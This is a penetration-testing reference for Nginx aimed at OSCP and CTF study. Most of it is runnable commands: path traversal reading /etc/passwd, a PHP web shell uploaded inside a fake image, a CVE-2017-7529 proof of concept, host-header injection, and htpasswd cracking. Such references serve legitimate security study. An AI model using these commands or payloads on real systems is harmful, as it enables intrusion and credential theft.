# Nginx

> Web server / reverse proxy reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -i '^server:'
```

Expected output:

```text
Server: nginx/1.18.0 (Ubuntu)
```

If `server_tokens off;`, the version is hidden:

```text
Server: nginx
```

### Default error pages

Nginx default 404 / 502 pages:

- `404 Not Found` / `nginx/1.18.0` footer
- `<center>nginx</center>` on the default welcome page
- `502 Bad Gateway` when upstream is down

### Reverse proxy fingerprint

Nginx as a reverse proxy typically adds / preserves:

- `Server: nginx`
- `X-Accel-*` headers (internal redirect hints)
- `Via:` (if proxying through)

If backend is Node/Python/Rails behind nginx, response headers may include
framework-specific headers (`X-Powered-By`, `X-Runtime`, `Set-Cookie: _rails...`)
while `Server` still says nginx.

### nmap / whatweb

```bash
nmap -sV -p 80,443,8080,8443 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

---

## 2. Enumeration

### Version + config hints

```bash
curl -sI http://<TARGET>/ | grep -i '^server:'
curl -s  http://<TARGET>/nginx_status
```

### Sensitive paths

```bash
for p in nginx_status status stub_status server-status .git/config .env \
         .htaccess web.config phpinfo.php backup.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p")
  echo "$code  $p"
done
```

### stub_status (if enabled)

```bash
curl -s http://<TARGET>/nginx_status
```

Expected output:

```text
Active connections: 1
server accepts handled requests
 15 15 21
Reading: 0 Writing: 1 Waiting: 0
```

### Alias traversal

Misconfigured `location /static { alias /var/www/static; }` (missing trailing slash)
allows `..` traversal:

```bash
curl --path-as-is "http://<TARGET>/static../etc/passwd"
curl --path-as-is "http://<TARGET>/static..%2f..%2f..%2fetc%2fpasswd"
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### HTTP methods

```bash
curl -s -X OPTIONS -i http://<TARGET>/ | grep -i allow
```

---

## 3. Known CVEs

### CVE-2019-20372 - HTTP request smuggling (error_page)

Error page handling allows request smuggling when `error_page` is used.
Chained with a backend that parses HTTP differently.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-20372
Affected: nginx 1.17.0 - 1.17.6 (fixed in 1.17.7).

### CVE-2021-23017 - DNS resolver off-by-one (RCE potential)

Off-by-one in the DNS resolver. Crafted DNS response from an upstream resolver
can overwrite one byte -> potential RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-23017
Affected: nginx 0.6.18 - 1.20.0 (fixed in 1.21.0).

### CVE-2017-7529 - Integer overflow (range filter)

Integer overflow in `ngx_http_range_filter_module` leaks memory (adjacent
response data). Read-only info leak.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-7529
Affected: nginx 0.5.6 - 1.13.2 (fixed in 1.13.3).

PoC:
```bash
python3 -c '
import requests, sys
url = sys.argv[1]
r = requests.get(url, headers={"Range": "bytes=-9223372036854775807,-9223372036854775800"})
print(r.status_code, len(r.content))
' http://<TARGET>/
```

### CVE-2013-2028 - Stack overflow (chunked encoding)

Stack-based buffer overflow in the chunked transfer encoding parser.
Pre-auth RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2013-2028
Affected: nginx 1.3.9 - 1.4.0 (fixed in 1.4.1).

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 1.17.0-1.17.6 | Request smuggling | CVE-2019-20372 |
| 0.6.18-1.20.0 | DNS resolver RCE | CVE-2021-23017 |
| 0.5.6-1.13.2 | Info leak | CVE-2017-7529 |
| 1.3.9-1.4.0 | Stack overflow | CVE-2013-2028 |

---

## 4. Exploitation Patterns

### Alias traversal (missing trailing slash)

Config: `location /static { alias /var/www/static; }`

```bash
curl --path-as-is "http://<TARGET>/static../etc/passwd"
```

Expected output:

```text
root:x:0:0:root:/root:/bin/bash
```

If PHP-FPM is upstream: append `..%2f..%2f..%2fvar%2flog%2fnginx%2faccess.log`
to include a PHP payload in the log, then request via the alias to trigger RCE.

### PHP-FPM + nginx misconfig -> RCE

If nginx passes `SCRIPT_FILENAME` based on URL path and PHP-FPM accepts
any `.php` path, upload a fake `.php` that contains code, then request it.

Common exploit chain:
1. Upload `avatar.jpg` (contains `<?php system($_GET['c']); ?>`).
2. Find a way to make nginx pass it to PHP-FPM as `.php`
   (e.g. `/avatar.jpg/shell.php` if `fastcgi_split_path_info` is wrong).

```bash
curl "http://<TARGET>/uploads/avatar.jpg/x.php?c=id"
```

### Host header injection

If nginx uses `$host` for redirects / cache keys without validation:

```bash
curl -H "Host: evil.com" http://<TARGET>/
curl -H "X-Forwarded-Host: evil.com" http://<TARGET>/
```

Can lead to: password reset link poisoning, cache poisoning, SSRF chaining.

### Request smuggling (CL.TE / TE.CL)

Chained with backend (Apache, gunicorn, node). Use `smuggler`:

```bash
git clone https://github.com/defparam/smuggler.git
python3 smuggler/smuggler.py -u http://<TARGET>/
```

### Internal path disclosure

Nginx often leaks internal paths in error messages when proxying:

```bash
curl -s "http://<TARGET>/nonexistent" | grep -iE 'path|file|/var/|/usr/'
```

---

## 5. Misconfigurations

### Directory listing

Autoindex on:

```bash
curl -s http://<TARGET>/uploads/ | grep -i 'index of'
```

### stub_status exposed

```bash
curl -s http://<TARGET>/nginx_status
```

### .git / .svn / .env

```bash
curl -s http://<TARGET>/.git/config
curl -s http://<TARGET>/.env
git-dumper http://<TARGET>/.git/ ./dump
```

### Default config files

```bash
curl -s http://<TARGET>/nginx.conf
curl -s http://<TARGET>/default.conf
```

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>/api/ | grep -i 'access-control'
```

### WebDAV (rare)

If `dav_methods` is on:

```bash
curl -X PROPFIND -H "Depth: 1" http://<TARGET>/
curl -X PUT -d "test" http://<TARGET>/test.txt
```

---

## 6. Post-Exploitation

### Config file locations

| OS | Path |
|----|------|
| Debian/Ubuntu | `/etc/nginx/nginx.conf` |
| Debian/Ubuntu (sites) | `/etc/nginx/sites-enabled/*` |
| RHEL/CentOS | `/etc/nginx/nginx.conf` |
| RHEL/CentOS (vhost) | `/etc/nginx/conf.d/*.conf` |
| FreeBSD | `/usr/local/etc/nginx/nginx.conf` |
| Docker | `/etc/nginx/nginx.conf` |

### What to look for in configs

```bash
grep -rE 'proxy_pass|fastcgi_pass|alias|root|auth_basic|ssl_certificate' /etc/nginx/ 2>/dev/null
```

Look for:
- `proxy_pass http://127.0.0.1:NNNN` -> internal services
- `alias /path` -> traversal opportunity
- `auth_basic_user_file` -> path to htpasswd file
- `ssl_certificate_key` -> private key
- `include /etc/nginx/secrets.conf` -> additional secret locations
- `fastcgi_pass unix:/run/php/php-fpm.sock` -> PHP-FPM socket

### Log files

```bash
ls -la /var/log/nginx/
tail -n 200 /var/log/nginx/access.log
```

### Credentials in auth_basic

```bash
cat /etc/nginx/.htpasswd
# Crack with:
# hashcat -m 1600 htpasswd.txt rockyou.txt      (apr1)
# hashcat -m 500  htpasswd.txt rockyou.txt      (md5crypt, if $1$)
# hashcat -m 1800 htpasswd.txt rockyou.txt      (sha512crypt, if $6$)
```

### Upstream / backend enumeration

From `proxy_pass`, `fastcgi_pass`:
- Internal APIs on 127.0.0.1:8080, 3000, 5000
- Docker socket: `unix:/var/run/docker.sock`
- Redis / Memcached

```bash
grep -rE 'unix:|127%2e0%2e0%2e1' /etc/nginx/
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Server header and, if visible, the exact nginx version.

> [!IMPORTANT]
> OSCP report: for alias traversal or request smuggling, screenshot both the raw HTTP request (curl -v or Burp) and the leaked file / smuggled response.

> [!IMPORTANT]
> OSCP report: if you found credentials in /etc/nginx/.htpasswd, screenshot the file line AND the cracked password.

---

## 8. References

- Nginx official docs - https://nginx.org/en/docs/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=nginx
- CVE-2017-7529 PoC - https://github.com/3ndG4me/nginx-1.13.2-CVE-2017-7529
- Request smuggling - https://portswigger.net/web-security/request-smuggling
- HackTricks - Nginx - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
- GTFOBins - https://gtfobins.github.io/

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
